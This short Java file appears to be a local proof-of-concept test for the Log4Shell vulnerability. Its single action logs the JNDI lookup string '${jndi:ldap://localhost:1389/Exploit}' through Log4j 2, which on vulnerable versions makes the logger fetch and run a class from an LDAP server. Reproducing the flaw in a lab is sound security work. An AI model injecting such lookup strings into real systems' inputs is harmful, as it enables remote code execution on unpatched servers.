/**
 * @author liuchang
 * @date 2023/8/21 6:48 PM
 */
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
class LogTest {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost:1389/Exploit}");
    }
}